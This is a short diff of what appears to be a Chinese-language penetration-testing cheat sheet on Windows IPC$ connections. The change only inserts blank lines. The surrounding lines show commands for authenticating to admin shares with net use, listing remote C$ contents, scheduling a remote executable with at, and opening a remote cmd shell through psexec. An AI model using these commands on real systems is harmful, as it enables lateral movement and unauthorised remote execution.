@@ -52,6 +52,7 @@ net share admin$
 **连接和上线命令**
 
 ```bash
+
 net use \\server\ipc$"password" /user:username # 工作组
 net use \\server\ipc$"password" /user:domain\username #域内
 dir \\xx.xx.xx.xx\C$\                # 查看文件列表
@@ -68,6 +69,7 @@ at \\IP 时间 c:\1.exe    #添加计划任务
 方法是 先建立IPC通道连接，然后直接使用，具体操作如下：
 
 ```bash
+
 net use \\192.168.0.1\ipc$ “password” /user:administrator # 同上 建立连接
 psexec.exe \\192.168.0.1 cmd                   # 进入半交互式cmdshell
 
